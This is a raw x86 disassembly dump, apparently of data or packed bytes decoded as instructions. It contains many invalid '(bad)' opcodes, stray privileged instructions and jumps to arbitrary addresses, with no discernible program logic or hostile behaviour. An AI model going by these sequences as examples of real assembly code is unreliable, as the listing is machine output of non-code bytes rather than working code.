  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x3a
  428f01:	ss cld 
  428f03:	mov    eax,ds:0x1b63c
  428f08:	add    eax,0x76000001
  428f0d:	jae    0x428eb5
  428f0f:	inc    edx
  428f10:	push   esi
  428f11:	push   es
  428f12:	xor    ch,bl
  428f14:	or     BYTE PTR [edi-0x1],ch
  428f17:	ret    0xe367
  428f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f1b:	jns    0x428f88
  428f1d:	mov    ecx,0xe3daa5d2
  428f22:	pop    edi
  428f23:	add    dh,BYTE PTR [esi]
  428f25:	ret    0xc4d1
  428f28:	inc    ebx
  428f29:	xchg   ch,dl
  428f2b:	xchg   esi,eax
  428f2c:	stos   BYTE PTR es:[edi],al
  428f2d:	mov    dl,0xf0
  428f2f:	iret   
  428f30:	hlt    
  428f31:	into   
  428f32:	scas   al,BYTE PTR es:[edi]
  428f33:	dec    esp
  428f34:	dec    esp
  428f35:	test   BYTE PTR [esi-0x4c33c01c],bl
  428f3b:	and    eax,0x20bad79
  428f40:	xchg   ebx,eax
  428f41:	test   BYTE PTR [edi],cl
  428f43:	push   ecx
  428f44:	int    0x4d
  428f46:	ss mov dl,0x32
  428f49:	pop    edi
  428f4a:	mov    bl,0xe7
  428f4c:	inc    ebp
  428f4d:	fiadd  WORD PTR [ebx-0x5e]
  428f50:	aam    0xe9
  428f52:	push   ecx
  428f53:	(bad)
  428f57:	or     esp,DWORD PTR [esi]
  428f59:	cmp    esi,DWORD PTR [edx+ecx*8-0x43425caa]
  428f60:	ret    0x899f
  428f63:	scas   eax,DWORD PTR es:[edi]
  428f64:	dec    ebp
  428f65:	jbe    0x428f80
  428f67:	sbb    al,BYTE PTR [ebp-0x7e]
  428f6a:	mov    al,0x11
  428f6c:	cwde   
  428f6d:	sar    BYTE PTR [ecx],cl
  428f6f:	cld    
  428f70:	nop
  428f71:	enter  0x676a,0x90
  428f75:	sub    eax,0x632d0bec
  428f7a:	dec    edx
  428f7b:	popa   
  428f7c:	(bad)
  428f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f80:	cmp    cl,BYTE PTR [eax+0x4b]
  428f83:	shl    ah,0xdc
  428f86:	jae    0x428feb
  428f88:	add    al,0x8d
  428f8a:	scas   al,BYTE PTR es:[edi]
  428f8b:	call   0x1009:0x1838b144
  428f92:	ja     0x428ff8
  428f94:	jp     0x428f21
  428f96:	jo     0x428fce
  428f98:	xchg   BYTE PTR ds:0x49a7512f,ch
  428f9e:	mov    al,ds:0x4773eae9
  428fa4:	daa    
  428fa5:	mov    cl,0x2e
  428fa7:	adc    bl,ah
  428fa9:	bound  ebp,QWORD PTR [ebx-0x2a]
  428fac:	mov    ?,ebp
  428fae:	loope  0x428fa6
  428fb0:	lahf   
  428fb1:	imul   ebx,DWORD PTR [edx+0x7003e00b],0x28
  428fb8:	jle    0x428fd6
  428fba:	mov    DWORD PTR [esi-0x3d],esi
  428fbd:	push   cs
  428fbe:	cmp    al,0xf
  428fc0:	dec    esi
  428fc1:	adc    eax,0x556acd58
  428fc6:	int3   
  428fc7:	hlt    
  428fc8:	ret    0xdead
  428fcb:	fs push ebp
  428fcd:	inc    ebx
  428fce:	mov    DWORD PTR [esi-0x36],0xddc0467c
  428fd5:	not    BYTE PTR [esp+esi*4]
  428fd8:	mov    cs,WORD PTR [eax-0x1cb3904e]
  428fde:	xor    eax,0xe62369e
  428fe3:	add    DWORD PTR [edi-0x73],eax
  428fe6:	pop    ebx
  428fe7:	cmp    DWORD PTR [eax-0x3734670b],ebp
  428fed:	retf   
  428fee:	repnz adc cl,BYTE PTR [esi-0x17c0b39c]
  428ff5:	push   eax
  428ff7:	inc    ebx
  428ff8:	and    DWORD PTR [eax+0x4d],0x19
  428ffc:	xor    BYTE PTR [esi],ch
  428ffe:	push   eax
  428fff:	xor    eax,0xf1dffbf4
  429004:	fcmove st,st(0)
  429006:	push   ecx
  429007:	stc    
  429008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429009:	jmp    0xe96dba06
  42900e:	jmp    0x0:0xe3d8
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xa0fc7b77
  429081:	hlt    
  429082:	pop    es
  429083:	pushf  
  429084:	inc    ecx
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0xe000001,al
  42908d:	test   DWORD PTR [eax+ecx*1-0x79d9de9f],ebp
  429094:	pop    es
  429095:	ret    
  429096:	xchg   esp,eax
  429097:	sub    BYTE PTR [esi],al
  429099:	data16 xor ch,BYTE PTR [esi]
  42909c:	pop    ebx
  42909d:	lea    ebp,[ecx-0x763b2f19]
  4290a3:	ret    
  4290a4:	into   
  4290a5:	mov    ch,0xcd
  4290a7:	adc    DWORD PTR [esp+ebx*8-0x3ad11b8c],eax
  4290ae:	test   al,0xd4
  4290b0:	and    DWORD PTR [edi+edx*8+0x56ce430b],ebx
  4290b7:	sub    DWORD PTR [esi],edi
  4290b9:	pop    ecx
  4290ba:	iret   
  4290bb:	inc    esp
  4290bc:	adc    DWORD PTR [ebx-0x3dca1c25],0x37fa12a1
  4290c6:	mov    dh,0xf1
  4290c8:	cmp    eax,0x29b7284c
  4290cd:	sub    esp,DWORD PTR gs:[esi-0x4bcef4a1]
  4290d4:	inc    eax
  4290d5:	repz add BYTE PTR [eax],ah
  4290d8:	sti    
  4290d9:	cdq    
  4290da:	shr    DWORD PTR [edi-0x7c],0xc3
  4290de:	or     BYTE PTR [ecx+edi*8+0x57],cl
  4290e2:	shl    BYTE PTR [ebp-0x34a9a147],cl
  4290e8:	or     DWORD PTR [ebp-0x4e8d2c19],esp
  4290ee:	test   al,0x4a
  4290f0:	loopne 0x429136
  4290f2:	push   ss
  4290f3:	add    DWORD PTR [ebx],edx
  4290f5:	setno  BYTE PTR [ebx-0x44]
  4290f9:	cmp    al,0xe6
  4290fb:	dec    edx
  4290fc:	loopne 0x429142
  4290fe:	jl     0x4290ad
  429100:	cmp    eax,0xc62c4a2c
  429105:	shr    DWORD PTR [ecx-0x43],cl
  429108:	aam    0x82
  42910a:	sub    eax,0x7e61b357
  42910f:	mul    esp
  429111:	mov    ah,0x9f
  429113:	dec    edx
  429114:	push   ds
  429115:	jae    0x42914c
  429117:	loope  0x42909d
  429119:	jo     0x4290e7
  42911b:	xor    BYTE PTR [ebx+0x15],0x87
  42911f:	shr    BYTE PTR [eax+edx*8],1
  429122:	adc    esp,edi
  429124:	sbb    esi,0x28
  429127:	sub    ecx,ebx
  429129:	jns    0x429118
  42912b:	mov    ch,0x42
  42912d:	xor    DWORD PTR ds:0x700553e5,ebp
  429133:	xchg   esp,eax
  429134:	nop
  429135:	mov    WORD PTR [esi+0x7fdb616c],?
  42913b:	aad    0x0
  42913d:	fwait
  42913e:	and    ebx,edx
  429140:	imul   eax,DWORD PTR [ebx],0xb95805d0
  429146:	(bad)  
  429147:	xor    BYTE PTR [eax-0x73],dl
  42914a:	add    DWORD PTR [ebx+edx*4+0x5331d3bf],ecx
  429151:	les    edx,FWORD PTR [edi-0x7e]
  429154:	dec    edi
  429155:	mov    bh,0x4
  429157:	shr    BYTE PTR [esi+0x14],0x12
  42915b:	mov    edx,0xd13a7d34
  429160:	out    dx,al
  429161:	popf   
  429162:	ret    
  429163:	xor    DWORD PTR [ebp+0x17],0x4436013a
  42916a:	xor    cl,ah
  42916c:	pop    esi
  42916d:	xchg   ecx,eax
  42916e:	rol    BYTE PTR [edi],0x8f
  429171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429172:	fbld   TBYTE PTR [esi]
  429174:	pop    ebp
  429175:	mov    dh,0xfb
  429177:	add    eax,DWORD PTR [ebx-0x4a]
  42917a:	cmp    esi,ebx
  42917c:	cmp    bl,BYTE PTR [ebp+eax*2+0x488b6411]
  429183:	adc    BYTE PTR [ebx+0x211c34ac],0xd5
  42918a:	aam    0x5e
  42918c:	or     dl,0x4f
  42918f:	pusha  
  429190:	push   edx
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [esp+esi*2+0x4687abb8],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [esi-0x7b927d6f],ch
  429211:	out    0x43,al
  429213:	arpl   WORD PTR [edx+0x194d3b7],bx
  429219:	or     cl,BYTE PTR [esi-0x46c2a1c]
  42921f:	xor    BYTE PTR [ebp-0x25d340e4],0xf6
  429226:	jge    0x42924f
  429228:	dec    ebx
  429229:	pushf  
  42922a:	cmp    al,0x2b
  42922c:	lods   al,BYTE PTR ds:[esi]
  42922d:	cmp    bh,0x5c
  429230:	inc    esi
  429231:	or     eax,0x7d050cfe
  429236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429237:	(bad)  
  429238:	add    bl,0x90
  42923b:	stc    
  42923c:	vunpckhps ymm0,ymm4,YMMWORD PTR [edi]
  429240:	jmp    0x63fd6dd8
  429245:	or     eax,0x71dc480c
  42924a:	mov    fs,WORD PTR [edx-0xe]
  42924d:	clc    
  42924e:	adc    eax,0x9356f1c4
  429253:	dec    edx
  429254:	das    
  429255:	loope  0x4292aa
  429257:	jmp    0x1a97c21f
  42925c:	sub    BYTE PTR fs:[ebp-0x6a],dh
  429260:	into   
  429261:	fnstsw WORD PTR [ebx]
  429263:	cli    
  429264:	mov    es,WORD PTR [ecx+0x1]
  429267:	nop
  429268:	dec    ecx
  429269:	cmp    al,0xcb
  42926b:	mov    edi,0x1cd51731
  429270:	sbb    al,0x84
  429272:	add    ah,dl
  429274:	shl    BYTE PTR [edi+0x4eb3cad3],1
  42927a:	push   es
  42927b:	inc    eax
  42927c:	out    dx,al
  42927d:	sub    eax,0xb62bd592
  429282:	out    dx,al
  429283:	ja     0x4292ca
  429285:	pushf  
  429286:	jnp    0x429226
  429288:	lea    edi,[ecx]
  42928a:	xchg   ebp,eax
  42928b:	hlt    
  42928c:	adc    DWORD PTR [ecx-0x73],esi
  42928f:	jbe    0x42928b
  429291:	xchg   esp,eax
  429292:	adc    dh,BYTE PTR ds:0x6316cd8b
  429298:	rol    DWORD PTR [ecx+0x54f99731],cl
  42929e:	sbb    eax,0x4e35c256
  4292a3:	(bad)  
  4292a4:	ins    BYTE PTR es:[edi],dx
  4292a5:	iret   
  4292a6:	das    
  4292a7:	xchg   BYTE PTR [eax-0x1b],ah
  4292aa:	mov    ?,WORD PTR [ebp-0x80]
  4292ad:	clc    
  4292ae:	cmp    DWORD PTR [ebp+0x7b],ebp
  4292b1:	mov    WORD PTR [ebx],fs
  4292b3:	or     al,0x3b
  4292b5:	push   cs
  4292b6:	or     al,0xd5
  4292b8:	dec    edx
  4292b9:	or     ch,ch
  4292bb:	xor    al,0x51
  4292bd:	jne    0x4292a7
  4292bf:	loop   0x429293
  4292c1:	stos   BYTE PTR es:[edi],al
  4292c2:	js     0x429306
  4292c4:	lea    eax,[edx-0x5125df63]
  4292ca:	dec    ebp
  4292cb:	pop    es
  4292cc:	xchg   DWORD PTR [ebx-0x3bac5cb],eax
  4292d2:	prefetchwt1 BYTE PTR [eax+0x2c]
  4292d6:	add    ecx,edx
  4292d8:	gs dec esp
  4292da:	add    edx,edx
  4292dc:	repz mov ah,0x45
  4292df:	fnstenv [eax+0x5b99c6b3]
  4292e5:	inc    edx
  4292e6:	(bad)  
  4292e7:	or     ah,ch
  4292e9:	leave  
  4292ea:	dec    ecx
  4292eb:	push   es
  4292ec:	pop    gs
  4292ee:	sub    edi,DWORD PTR [edi-0x46]
  4292f1:	mov    eax,ds:0xfeb4d61f
  4292f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292f7:	test   DWORD PTR [ebx+0x24],0x7432b37
  4292fe:	push   edx
  4292ff:	dec    edx
  429300:	fisub  DWORD PTR [ecx]
  429302:	mov    esi,0x31ba4cc7
  429307:	inc    ebp
  429308:	adc    al,0xfb
  42930a:	ss add di,di
  42930e:	mov    al,ds:0x6bd
	...
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xf9
  429381:	jne    0x429308
  429383:	addr16 dec ebx
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	jecxz  0x4293e2
  42938e:	pop    ebp
  42938f:	inc    edi
  429390:	adc    BYTE PTR [esi-0x52d5ee71],al
  429396:	xchg   edi,eax
  429397:	xor    DWORD PTR [ebx],0x8667b618
  42939d:	imul   BYTE PTR [esi+0x13]
  4293a0:	adc    ah,ah
  4293a2:	out    0x5,eax
  4293a4:	or     BYTE PTR [eax+0x54b52266],al
  4293aa:	ss ds add esp,eax
  4293ae:	push   cs
  4293af:	cmc    
  4293b0:	adc    DWORD PTR [ebx+0x64],0x79072e99
  4293b7:	(bad)  
  4293b8:	into   
  4293b9:	sub    dh,BYTE PTR [edi]
  4293bb:	cdq    
  4293bc:	pop    ecx
  4293bd:	fs cwde 
  4293bf:	sub    ch,ch
  4293c1:	bound  ecx,QWORD PTR [ebx-0x380b5d6]
  4293c7:	mov    dh,0x69
  4293c9:	jmp    0xd05dc347
  4293ce:	mov    dh,BYTE PTR [edi+edx*8+0x33]
  4293d2:	scas   eax,DWORD PTR es:[edi]
  4293d3:	nop
  4293d4:	mov    al,0x4
  4293d6:	sbb    eax,0xce6316b7
  4293db:	add    BYTE PTR [edx-0x515a1899],ah
  4293e1:	mov    bh,0xa4
  4293e3:	test   DWORD PTR [esi+0x5cc1e15],0xb8bcfebf
  4293ed:	stos   BYTE PTR es:[edi],al
  4293ee:	fmul   DWORD PTR [ebx]
  4293f0:	pop    ebx
  4293f1:	in     eax,0x3c
  4293f3:	clc    
  4293f4:	mov    esi,DWORD PTR [eax]
  4293f6:	mov    ah,0x3e
  4293f8:	mov    eax,0x91342a7d
  4293fd:	cmp    bh,ah
  4293ff:	sub    esi,edx
  429401:	xchg   ebx,eax
  429402:	cmp    ecx,DWORD PTR [ecx+edx*2+0x55]
  429406:	add    DWORD PTR [ecx-0x68],0xffffff89
  42940a:	sbb    BYTE PTR [ebx-0x3],cl
  42940d:	iret   
  42940e:	leave  
  42940f:	call   0x6731f1ff
  429414:	fwait
  429415:	mov    DWORD PTR [edx+eiz*8],edx
  429418:	xchg   BYTE PTR [ebp+0x3b],bh
  42941b:	or     DWORD PTR [ebx+eax*2],ebp
  42941e:	retf   0xeaf5
  429421:	and    al,0x7e
  429423:	inc    ecx
  429424:	jp     0x429414
  429426:	xchg   ebx,eax
  429427:	adc    DWORD PTR [edi+0x6f],0x151eddff
  42942e:	nop
  42942f:	ds in  al,0x41
  429432:	iret   
  429433:	push   esp
  429434:	adc    BYTE PTR [ecx-0x36ac6173],dh
  42943a:	lahf   
  42943b:	mov    dh,0xd0
  42943d:	test   ebx,0xcc55a2e1
  429443:	mov    DWORD PTR [edx-0x54e52ccc],0x569a333a
  42944d:	add    ecx,DWORD PTR [esi-0x56438346]
  429453:	dec    esi
  429454:	sub    DWORD PTR [ebp+0x7a],0xc18c0359
  42945b:	lods   al,BYTE PTR ds:[esi]
  42945c:	cmp    ecx,ecx
  42945e:	mov    bl,0x3b
  429460:	aas    
  429461:	mov    ebx,0xf6af779b
  429466:	sti    
  429467:	mov    dl,BYTE PTR [ebp*2-0x62ce1ef7]
  42946e:	add    bh,ch
  429470:	cli    
  429471:	mov    ecx,0x7e1ab27e
  429476:	aas    
  429477:	rcr    BYTE PTR [edx-0x4],0x39
  42947b:	retf   
  42947c:	repnz popa 
  42947e:	or     bh,BYTE PTR [esp+ebp*8-0x1ef548]
  429485:	and    eax,0xb5d4bc5a
  42948a:	out    dx,eax
  42948b:	xchg   ebp,eax
  42948c:	inc    edx
  42948d:	shl    ecx,cl
  42948f:	lahf   
  429490:	(bad)  
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x6d9ac9ea],dx
  429503:	pop    es
  429504:	push   eax
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	jp     0x429532
  42950e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42950f:	xchg   edx,eax
  429510:	xor    eax,0xba3bd5d0
  429515:	cmp    eax,0x3e1a7597
  42951a:	loop   0x4294ee
  42951c:	aad    0x26
  42951e:	inc    edx
  42951f:	fidiv  WORD PTR [ecx-0x701a1823]
  429525:	inc    edi
  429526:	push   ebx
  429527:	cld    
  429528:	cmp    al,0x97
  42952a:	aas    
  42952b:	pushf  
  42952c:	stc    
  42952d:	push   ss
  42952e:	add    al,0x9b
  429530:	cmp    DWORD PTR [edi+0x30a45994],0xd
  429537:	dec    ecx
  429539:	jg     0x429559
  42953b:	repz sub ecx,eax
  42953e:	cmp    DWORD PTR [eax-0x5e20934b],ebp
  429544:	mov    esp,0x635233dc
  429549:	xor    edi,DWORD PTR [edx+0x6c]
  42954c:	ins    DWORD PTR es:[edi],dx
  42954d:	int    0x44
  42954f:	xchg   esi,eax
  429550:	mov    fs,WORD PTR [ebx-0x4eca07de]
  429556:	jns    0x429574
  429558:	push   ds
  429559:	mov    eax,ds:0x77470b57
  42955e:	loop   0x4294fc
  429560:	imul   esp
  429562:	mov    ds:0xc3be6410,eax
  429567:	fisttp WORD PTR [ecx+0xef7f3a]
  42956d:	(bad)  
  42956e:	sub    eax,0x86e95f09
  429573:	cmp    BYTE PTR [eax+0x13aecd09],0xd5
  42957a:	iret   
  42957b:	and    DWORD PTR [ecx-0x322c5fc2],esi
  429581:	outs   dx,DWORD PTR ds:[esi]
  429582:	inc    edx
  429583:	add    al,0x67
  429585:	xchg   ebp,eax
  429586:	cld    
  429587:	inc    esi
  429588:	popa   
  429589:	retf   0xc752
  42958c:	lahf   
  42958d:	jmp    0x429550
  42958f:	sub    BYTE PTR [ebp+0x32],bh
  429592:	pop    es
  429593:	bound  ebp,QWORD PTR [eax+0xf]
  429596:	mov    ds:0x1d9ab6a2,al
  42959b:	xchg   BYTE PTR [eax],al
  42959d:	xchg   ebx,eax
  42959e:	inc    esp
  42959f:	retf   
  4295a0:	mov    ebp,0x42f588e9
  4295a5:	mov    ch,BYTE PTR [ebx]
  4295a7:	jbe    0x4295e1
  4295a9:	or     eax,0xc44446ef
  4295ae:	jae    0x429617
  4295b0:	mov    ds:0xe5ab88dc,eax
  4295b5:	loop   0x429629
  4295b7:	call   0x603f:0x24e6acc
  4295be:	xor    eax,0x72649ca7
  4295c3:	sub    al,0x71
  4295c5:	push   edi
  4295c6:	ret    
  4295c7:	ins    DWORD PTR es:[edi],dx
  4295c8:	mov    edx,cs
  4295ca:	das    
  4295cb:	mov    al,0x61
  4295cd:	(bad)  
  4295ce:	les    esi,FWORD PTR [esi+0x2cae421]
  4295d4:	mov    ds:0xfc90f2ef,eax
  4295d9:	cmp    ebx,esi
  4295db:	in     eax,0xfb
  4295dd:	add    al,0xd
  4295df:	push   esi
  4295e0:	in     al,dx
  4295e1:	xlat   BYTE PTR ds:[ebx]
  4295e2:	js     0x42959f
  4295e4:	(bad)  
  4295e5:	xchg   edx,eax
  4295e6:	retf   
  4295e7:	aam    0x7b
  4295e9:	mov    ah,0xc3
  4295eb:	push   cs
  4295ec:	cdq    
  4295ed:	pop    ecx
  4295ee:	jp     0x42957d
  4295f0:	fstp   QWORD PTR [ecx-0x32d07791]
  4295f6:	dec    edx
  4295f7:	sbb    DWORD PTR [esi],eax
  4295f9:	cmp    eax,DWORD PTR [eax-0x9]
  4295fc:	das    
  4295fd:	ja     0x4295b4
  4295ff:	and    DWORD PTR [edx],esp
  429601:	lea    esi,[edx-0x27]
  429604:	ds mov ah,0xbd
  429607:	cmp    al,0x52
  429609:	jl     0x4295d7
  42960b:	sub    DWORD PTR [ecx+ebp*8-0x5c],edi
  42960f:	push   esp
  429610:	adc    al,0x0
	...
  429672:	add    BYTE PTR [eax],al
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	call   0x1bb:0x552c62b1
  429687:	add    BYTE PTR ds:0x2000001,al
  42968d:	call   edi
  42968f:	and    DWORD PTR [esi-0x662b858],0x55046d74
  429699:	sub    edx,DWORD PTR [ebp-0x77a1932f]
  42969f:	cmp    eax,0xd6f846e8
  4296a4:	xchg   esp,eax
  4296a5:	ins    BYTE PTR es:[edi],dx
  4296a6:	xor    dh,BYTE PTR [ecx+eax*1+0x49]
  4296aa:	call   0x9de6:0x698bc460
  4296b1:	mov    dh,0xa8
  4296b3:	pop    eax
  4296b4:	mov    dh,0x23
  4296b6:	adc    eax,0x286f02d7
  4296bb:	push   edx
  4296bc:	jle    0x42967c
  4296be:	cmp    BYTE PTR [edx],ch
  4296c0:	mov    ah,ch
  4296c2:	shr    ch,1
  4296c4:	stos   DWORD PTR es:[edi],eax
  4296c5:	stos   BYTE PTR es:[edi],al
  4296c6:	sub    esi,DWORD PTR [ebx]
  4296c8:	mov    edx,0xfe7f7205
  4296cd:	push   0x2362efe5
  4296d2:	test   al,0x94
  4296d4:	(bad)  
  4296d5:	out    0x66,eax
  4296d7:	in     al,0x3e
  4296d9:	lahf   
  4296da:	xchg   ecx,eax
  4296db:	inc    ebx
  4296dc:	imul   ebx,DWORD PTR [edx-0x46],0x6953e822
  4296e3:	popa   
  4296e4:	popa   
  4296e5:	or     eax,DWORD PTR [edi]
  4296e7:	sbb    DWORD PTR [eax+eax*1],ebx
  4296ea:	pop    ebx
  4296eb:	lahf   
  4296ec:	shl    BYTE PTR [edx],1
  4296ee:	inc    ebp
  4296ef:	mov    cl,0x5b
  4296f1:	(bad)  
  4296f2:	mov    WORD PTR [bx-0x3c],?
  4296f6:	sahf   
  4296f7:	xor    eax,0x4f884947
  4296fc:	adc    edi,DWORD PTR [esi+0x6738daa1]
  429702:	enter  0x439e,0x1d
  429706:	jnp    0x429700
  429708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429709:	mov    eax,0xd9a10204
  42970e:	nop
  42970f:	xchg   edi,eax
  429710:	les    ebp,FWORD PTR [ebp+edx*4+0x6c4b39ef]
  429717:	call   0xbccaba9b
  42971c:	mov    WORD PTR [edi+0x61],?
  42971f:	add    ch,bh
  429721:	in     al,0x7a
  429723:	dec    ebp
  429724:	ss cdq 
  429726:	mov    eax,0x3d0fcb85
  42972b:	push   esp
  42972c:	loopne 0x42977d
  42972e:	sub    ah,cl
  429730:	push   0x3d
  429732:	nop
  429733:	mov    esi,0x23007024
  429738:	or     ah,BYTE PTR [ebx-0x4d]
  42973b:	stc    
  42973c:	int3   
  42973d:	inc    esp
  42973e:	fldz   
  429740:	dec    ebp
  429741:	enter  0x9c32,0x9d
  429745:	and    eax,edx
  429747:	sub    DWORD PTR [eax],0x35
  42974a:	repnz cmp eax,0x45e7131c
  429750:	pop    edx
  429751:	add    eax,0x8c52b0bd
  429756:	cdq    
  429757:	mov    esp,0xf61b54e2
  42975c:	imul   esi,DWORD PTR [eax+0x6b925595],0x5e
  429763:	push   edx
  429764:	repz neg DWORD PTR [eax]
  429767:	in     al,0x15
  429769:	sub    eax,0xc7ac81d5
  42976e:	mov    ebx,DWORD PTR [ecx+0x5e]
  429771:	mov    esp,0x584fe157
  429776:	and    esi,DWORD PTR [ebx]
  429778:	mov    ah,0x18
  42977a:	sub    BYTE PTR [ecx-0x4c803ed4],0x6e
  429781:	mov    BYTE PTR [esi],0xed
  429784:	cmp    al,BYTE PTR [edi+0xa]
  429787:	dec    ecx
  429788:	adc    eax,0x8bf75f90
  42978d:	les    ebp,FWORD PTR [ecx-0x3]
  429790:	cmp    al,BYTE PTR [eax]
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	sbb    esi,DWORD PTR [edi]
  429802:	(bad)
  429806:	add    DWORD PTR [eax],eax
  429808:	add    eax,0x53000001
  42980d:	cmp    BYTE PTR [eax+0x70],bh
  429810:	mov    edi,0xcf1cc75
  429815:	enter  0x742d,0x6a
  429819:	jle    0x429837
  42981b:	mov    bl,ah
  42981d:	xchg   edx,eax
  42981e:	adc    eax,0x4d4d6604
  429823:	xchg   edx,eax
  429824:	push   0x42
  429826:	or     ebp,DWORD PTR [ebx+0x15deec40]
  42982c:	dec    ebx
  42982d:	ret    0xcf37
  429830:	or     ecx,edx
  429832:	cmp    DWORD PTR [esi],esp
  429834:	push   ebx
  429835:	stc    
  429836:	mov    eax,0x466109a1
  42983b:	test   DWORD PTR [eax+0x46],esi
  42983e:	dec    ebp
  42983f:	out    0xe2,eax
  429841:	in     al,0xb3
  429843:	loop   0x4297f5
  429845:	fisub  DWORD PTR [ebp-0x123ac217]
  42984b:	jge    0x4298c6
  42984d:	int3   
  42984e:	mov    dh,0xbb
  429850:	or     al,ch
  429852:	push   eax
  429853:	xchg   edx,eax
  429854:	pusha  
  429855:	lock loopne 0x42980d
  429858:	test   al,0x5e
  42985a:	add    ecx,eax
  42985c:	gs popf 
  42985e:	mov    eax,ds:0xca0dc030
  429863:	xchg   esp,eax
  429864:	jbe    0x429864
  429866:	pushf  
  429867:	adc    al,0xb4
  429869:	add    BYTE PTR [esp+ebx*8-0x3a],dh
  42986d:	aaa    
  42986e:	add    BYTE PTR [edi],dh
  429870:	repz pop es
  429872:	mov    edi,0xf1812fc6
  429877:	cmp    DWORD PTR [ecx-0x2199cfd6],ebp
  42987d:	or     dl,BYTE PTR [ebx]
  42987f:	lea    esi,[ebx]
  429881:	sub    al,0x38
  429883:	in     al,0xbd
  429885:	xor    al,dh
  429887:	mov    dh,0x31
  429889:	lods   eax,DWORD PTR ds:[esi]
  42988a:	sbb    DWORD PTR [ecx+ebp*1],eax
  42988d:	inc    esp
  42988e:	test   eax,0xaee867a1
  429893:	xchg   ebp,eax
  429894:	test   eax,0xbe55b5c
  429899:	cmp    eax,0xa3bb56bf
  42989e:	scas   eax,DWORD PTR es:[edi]
  42989f:	js     0x42985c
  4298a1:	pop    ecx
  4298a2:	ins    BYTE PTR es:[edi],dx
  4298a3:	and    esi,DWORD PTR [esi-0x33]
  4298a6:	pop    edi
  4298a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298a8:	lea    ebp,[esi+0x30]
  4298ab:	push   edx
  4298ac:	lods   eax,DWORD PTR ds:[esi]
  4298ad:	out    0x58,al
  4298af:	xchg   ebp,eax
  4298b0:	iret   
  4298b1:	arpl   WORD PTR [ebp-0x2a],ax
  4298b4:	and    DWORD PTR [ebx],eax
  4298b6:	dec    edi
  4298b7:	test   BYTE PTR [esi-0x6e],0x64
  4298bb:	outs   dx,BYTE PTR ds:[esi]
  4298bc:	(bad)  
  4298bd:	mov    ebx,0xf3d9e2e1
  4298c2:	icebp  
  4298c3:	push   esi
  4298c4:	jns    0x42989b
  4298c6:	push   es
  4298c7:	sbb    dh,BYTE PTR [edi+ebp*4]
  4298ca:	jmp    0x31c66a8f
  4298cf:	mov    edx,cs
  4298d1:	rol    DWORD PTR [eax],0x65
  4298d4:	test   al,0x76
  4298d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298d7:	pop    ebp
  4298d8:	and    bl,ah
  4298da:	mov    ecx,0xca93a669
  4298df:	loopne 0x42988d
  4298e1:	imul   ecx,DWORD PTR [ecx+0x3e],0xf
  4298e5:	mov    dl,0x84
  4298e7:	cmp    eax,0x7f95325a
  4298ec:	and    al,0xf2
  4298ee:	rcl    ecx,cl
  4298f0:	(bad)  
  4298f1:	test   eax,0x7fcde65e
  4298f6:	(bad)
  4298fa:	(bad)  
  4298fb:	icebp  
  4298fc:	ja     0x4298aa
  4298fe:	xor    DWORD PTR [esi],esp
  429900:	xor    BYTE PTR ds:0x6bcd64,cl
  429906:	test   al,0x85
  429908:	jno    0x4298e3
  42990a:	in     eax,dx
  42990b:	pop    edi
  42990c:	imul   ebp,DWORD PTR [ebp+0xe],0x26
  429910:	jge    0x429912
	...
  429972:	add    BYTE PTR [eax],al
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	and    al,0x8d
  429982:	push   ebx
  429983:	dec    ebp
  429984:	pop    edi
  429985:	mov    ebp,0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	aam    0xba
  42998e:	dec    edx
  42998f:	scas   eax,DWORD PTR es:[edi]
  429990:	and    ecx,esi
  429992:	popa   
  429993:	pop    esp
  429994:	jns    0x429a06
  429996:	dec    edi
  429997:	sub    bl,BYTE PTR [eax+ebx*1-0x37c69a28]
  42999e:	mov    ecx,DWORD PTR [esi+0x24e09a0e]
  4299a4:	mov    bh,0xee
  4299a6:	inc    eax
  4299a7:	inc    esp
  4299a8:	loopne 0x429971
  4299aa:	mov    eax,ds:0x4dfd1138
